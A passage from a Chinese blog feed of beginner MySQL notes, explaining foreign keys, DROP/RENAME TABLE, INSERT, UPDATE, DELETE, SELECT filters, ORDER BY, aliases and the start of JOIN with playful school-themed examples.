&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">ALTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TABLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">保存外键的表&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">ADD&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">CONSTRAINT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">外键约束的名字，一般&lt;/span>&lt;span class="n">fk开头&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">FOREIGN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">KEY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="err">外键名&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">REFERENCES&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">引用的表名&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="err">引用的键名&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>比较复杂。&lt;/p>
&lt;h3 id="删除表">删除表&lt;/h3>
&lt;p>那么终于到了期待已久的删库跑路阶段。&lt;/p>
&lt;p>删除表的语法非常简单，那么从一开始活到现在的这所学校终于干不下去了，校长决定遣散学生。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">DROP&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TABLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>人走光了。&lt;/p>
&lt;h3 id="重命名表">重命名表&lt;/h3>
&lt;p>校长决定把学校改成夜总会，于是他写道：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">RENAME&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TABLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">school&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">night_club&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>要是换行有这么容易就好了&amp;hellip;&amp;hellip;（你敢说回车看看）&lt;/p></description></item><item><title>MySQL 24小时入门笔记 - 3</title><link>https://nnnewb.github.io/blog/p/mysql-24%E5%B0%8F%E6%97%B6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-3/</link><pubDate>Sat, 23 Jun 2018 21:51:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/mysql-24%E5%B0%8F%E6%97%B6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-3/</guid><description>&lt;h2 id="插入">插入&lt;/h2>
&lt;h3 id="insert">INSERT&lt;/h3>
&lt;p>&lt;code>INSERT&lt;/code>用法非常简单。现在我们有表&lt;code>students&lt;/code>如下。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>列名&lt;/th>
&lt;th>类型&lt;/th>
&lt;th>约束&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>id&lt;/td>
&lt;td>int&lt;/td>
&lt;td>primary key&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>name&lt;/td>
&lt;td>char(16)&lt;/td>
&lt;td>NOT NULL&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>向里面插入一条学号为&lt;code>1&lt;/code>，姓名为&lt;code>学姐&lt;/code>的学生，只需要写如下&lt;code>SQL&lt;/code>语句。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">INSERT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INTO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">VALUES&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;学姐&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>语法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">INSERT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INTO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">表&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">VALUES&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">列值&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="err">列值&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,...);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中&lt;code>INSERT&lt;/code>语句有一个简单的变体，能比较明确地指明将值交付给哪个列。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">INSERT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INTO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">VALUES&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;学妹&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样写相当于指明了&lt;code>1&lt;/code>应该是&lt;code>id&lt;/code>，&lt;code>'学妹'&lt;/code>应该是&lt;code>name&lt;/code>。&lt;/p>
&lt;p>插入多条也很简单，只要在&lt;code>VALUES&lt;/code>后面跟更多小括号包围的值集合就行了，记得拿括号分隔，下面给个例子。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">INSERT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INTO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">VALUES&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;学渣&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;学霸&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;学神&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="insert-select">INSERT SELECT&lt;/h3>
&lt;p>这个写法比较有意思，从一个表查询出数据，并插入另一个表。&lt;/p>
&lt;p>举个例子来说，我们有两个班级表，分别叫&lt;code>学渣班&lt;/code>和&lt;code>补习班&lt;/code>，一旦学渣成绩烂到一定程度，那么我们就要把他分配到补习班里去强制补习。&lt;/p>
&lt;p>怎么做呢？看下面啦。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">INSERT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INTO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">补习班&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">score&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">学渣班&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">学渣班&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">score&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">学渣班&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">学渣班&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">score&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>值得注意的是，&lt;code>INSERT&lt;/code> 填充补习班表时用的并不是你&lt;code>SELECT&lt;/code>的列名，而是&lt;code>SELECT&lt;/code>后列名的顺序，来对应到要&lt;code>INSERT&lt;/code>的表的列上。&lt;/p>
&lt;p>其他的写法和&lt;code>SELECT&lt;/code>相同。&lt;/p>
&lt;h2 id="修改">修改&lt;/h2>
&lt;h3 id="update">UPDATE&lt;/h3>
&lt;p>&lt;code>UPDATE&lt;/code>语句的作用是修改现存行的数据，非常值得注意的是用&lt;code>UPDATE&lt;/code>语句时一定要小心写&lt;code>WHERE&lt;/code>子句，不然就等着删库跑路吧。&lt;/p>
&lt;p>依然举个实际栗子，学号为&lt;code>10&lt;/code>的学生成绩由于作弊而被取消了，我们要更新他的成绩为 0 分，这真是个悲伤的故事:P&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">UPDATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SET&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">score&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>语法是这样的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">UPDATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">表名&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SET&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">列名&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">新值&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">条件&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>更新多条的话是这样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">UPDATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">表名&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">SET&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">列&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">新值&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">列&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">新值&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">...&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">列&lt;/span>&lt;span class="n">N&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">新值&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">条件&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>千万小心，如果没有 &lt;code>WHERE&lt;/code>子句的话，指定的列会全部被设置成这个值。这样一来，所有的学生都变成了 0 分&amp;hellip;&amp;hellip;你会被手撕了的。&lt;/p>
&lt;/blockquote>
&lt;h2 id="删除">删除&lt;/h2>
&lt;h3 id="delete">DELETE&lt;/h3>
&lt;p>&lt;code>DELETE&lt;/code>的作用是删除行，同样的，万分注意&lt;code>WHERE&lt;/code>子句一定要正确编写，不然真的要删库跑路了。&lt;/p>
&lt;p>同样以之前那位作弊的同学为例，很遗憾，他又一次作弊被抓住了，传说中的高科技 AR 技术作弊眼镜也没能让他逃过监考员的火眼金睛，于是他被退学了&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>另一个悲伤的故事:P&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">DELETE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>语法是这样子的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">DELETE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">表名&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">条件&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果不写&lt;code>WHERE&lt;/code>的话&amp;hellip;&amp;hellip;找个好点的新工作吧，不要再去写&lt;code>SQL&lt;/code>了，ORM 多好。&lt;/p>
&lt;blockquote>
&lt;p>注意，不写&lt;code>WHERE&lt;/code>子句会删除这个表里的所有行。&lt;/p>
&lt;/blockquote></description></item><item><title>MySQL 24小时入门笔记 - 2</title><link>https://nnnewb.github.io/blog/p/mysql-24%E5%B0%8F%E6%97%B6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-2/</link><pubDate>Sat, 23 Jun 2018 15:41:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/mysql-24%E5%B0%8F%E6%97%B6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-2/</guid><description>&lt;h2 id="查询">查询&lt;/h2>
&lt;h3 id="select">SELECT&lt;/h3>
&lt;p>&lt;code>SELECT&lt;/code>是一个特殊的关键字，它的语义是查询，取出结果。&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>注意&lt;/strong>：仅为个人理解。&lt;/p>
&lt;/blockquote>
&lt;h3 id="from">FROM&lt;/h3>
&lt;p>&lt;code>FROM&lt;/code>子句，标识要查询的对象的来源，来源可能是多个的。在查询有多个来源表的情况下，称之为联结查询（&lt;code>Join query&lt;/code>）。&lt;/p>
&lt;p>最常见的常规写法是&lt;code>SELECT column FROM table&lt;/code>，表示从特定表取出所有行的特定列。&lt;/p>
&lt;h3 id="where">WHERE&lt;/h3>
&lt;p>&lt;code>WHERE&lt;/code>子句用于过滤查询的行，只有满足条件的行会被查询出来。&lt;/p>
&lt;p>常见的用法有&lt;code>SELECT column FROM table WHERE column &amp;lt;&amp;gt; 0&lt;/code>，表示在&lt;code>table&lt;/code>表中查询&lt;code>column&lt;/code>非空的行，返回这些行的&lt;code>column&lt;/code>。&lt;/p>
&lt;p>其中的二元关系运算符&lt;code>&amp;lt;&amp;gt;&lt;/code>表示不等于，其他常见的关系运算符还有这些。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>运算符&lt;/th>
&lt;th>含义&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>=&lt;/code>&lt;/td>
&lt;td>相等&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;gt;&lt;/code>&lt;/td>
&lt;td>大于&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;lt;&lt;/code>&lt;/td>
&lt;td>小于&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;gt;=&lt;/code>&lt;/td>
&lt;td>大于等于&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;lt;=&lt;/code>&lt;/td>
&lt;td>小于等于&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>!=&lt;/code>&lt;/td>
&lt;td>不等于&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;lt;&amp;gt;&lt;/code>&lt;/td>
&lt;td>不等于&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>此外还有一些&lt;code>SQL&lt;/code>关键字可以辅助编写判断逻辑。&lt;/p>
&lt;p>&lt;code>SQL&lt;/code>关键字&lt;code>IN&lt;/code>可以用于判断元素是否在集合中。举例，&lt;code>SELECT 1 IN (1,2,3)&lt;/code>，查询&lt;code>1&lt;/code>是否在&lt;code>1,2,3&lt;/code>这个集合中。被判断的集合需要被小括号包围，并且以逗号分隔元素。&lt;/p>
&lt;p>&lt;code>SQL&lt;/code>关键字&lt;code>BETWEEN&lt;/code>可以判断元素是否在一定区间中。举例，&lt;code>SELECT 1 BETWEEN 0 and 10&lt;/code>，查询&lt;code>1&lt;/code>是否在&lt;code>0&lt;/code>到&lt;code>10&lt;/code>的区间内。语法是&lt;code>BETWEEN [low] AND [high]&lt;/code>，区间较小的一端必须在左侧，较大的一端必须在右侧。&lt;/p>
&lt;p>&lt;code>SQL&lt;/code>关键字&lt;code>LIKE&lt;/code>可以用非常简单的通配符来判断元素是否匹配一定的规则。举例，&lt;code>SELECT 'abcabcabc' LIKE '%CAB%'&lt;/code>，判断字符串&lt;code>abcabcabc&lt;/code>是否匹配&lt;code>%CAB%&lt;/code>。值得注意的是，模式串中的&lt;code>%&lt;/code>代表的是匹配 0 或任意多个字符，就像是正则表达式中的&lt;code>*&lt;/code>一样。此外还有&lt;code>_&lt;/code>，下划线，匹配 1 个任意字符。&lt;/p>
&lt;p>&lt;code>MySQL&lt;/code>扩展的&lt;code>REGEXP&lt;/code>可以用正则表达式来匹配元素是否符合模式串。举例，&lt;code>SELECT 'abcabcabc' REGEXP '.*cab.*'&lt;/code>，正则表达式不做赘述，简单的模式串大家都会写。&lt;/p>
&lt;h3 id="order-by">ORDER BY&lt;/h3>
&lt;p>&lt;code>ORDER BY&lt;/code>就像字面意义上说的那样，按照某个列来进行排序。举例来说，我有一个学生表，记录了学号和姓名，我可以按照学号排序。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ORDER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">BY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>默认排序是升序，也可以通过指定&lt;code>DESC&lt;/code>或者&lt;code>ASC&lt;/code>来决定怎么排。&lt;code>ASC&lt;/code>是升序，&lt;code>DESC&lt;/code>是降序。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ORDER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">BY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">DESC&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="as">AS&lt;/h3>
&lt;p>&lt;code>AS&lt;/code>常见的用法是建立别名。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">column&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id_alias&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">my_table&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">table_alias&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">table_alias&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">column&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里出现了一个新的语法细节，&lt;code>table_alias.column&lt;/code>。用点&lt;code>.&lt;/code>连接表名和列名的行为类似于 C++中的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="k">typedef&lt;/span> &lt;span class="n">table_alias&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">my_table&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">id_alias&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">SELECT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">table_alias&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">column&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">table_alias&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">column&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>看得出来，&lt;code>table_alias.column&lt;/code>是完全限定了&lt;code>column&lt;/code>是哪个&lt;code>column&lt;/code>，之所以有这种语法，是因为&lt;code>FROM&lt;/code>子句需要支持多个表作为查询来源。到时候可能就会用到&lt;code>table1.column &amp;lt;&amp;gt; 1 AND table2.column &amp;lt;&amp;gt; 2&lt;/code>这样的写法了。&lt;/p>
&lt;p>而查询开头的&lt;code>column AS id_alias&lt;/code>则是标识查询结果列叫做&lt;code>id_alias&lt;/code>，举例如子查询的情况下，便于引用。&lt;/p>
&lt;h3 id="join">JOIN&lt;/h3>
&lt;p>&lt;code>JOIN&lt;/code>的术语叫做&lt;strong>联结&lt;/strong>，使用了&lt;code>JOIN&lt;/code>关键字的查询叫做&lt;strong>联结查询&lt;/strong>。&lt;/p>
&lt;p>联结查询和一般的查询不同的地方是，联结查询的数据来源是多个表。&lt;/p>
&lt;p>最简单的联结查询是内联结查询。&lt;/p>
&lt;p>举例来说，我现在有表&lt;code>students&lt;/code>如下，所有学生根据超能力开发等级分配到多个班级。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>name&lt;/th>
&lt;th>class&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>stu1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>stu2&lt;/td>
&lt;td>2&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>stu3&lt;/td>
&lt;td>3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>stu4&lt;/td>
&lt;td>4&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>又有表&lt;code>top_class&lt;/code>，收录了所有接收高等级超能力者的班级，能进入这些班级的学生都是如同能考上&lt;code>985&lt;/code>、&lt;code>211&lt;/code>般恐怖如斯的存在。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>name&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>Lv 5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>Lv 4&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>Lv 3&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>现在我们要查询出学生中那些恐怖如斯的存在有哪些。&lt;/p>
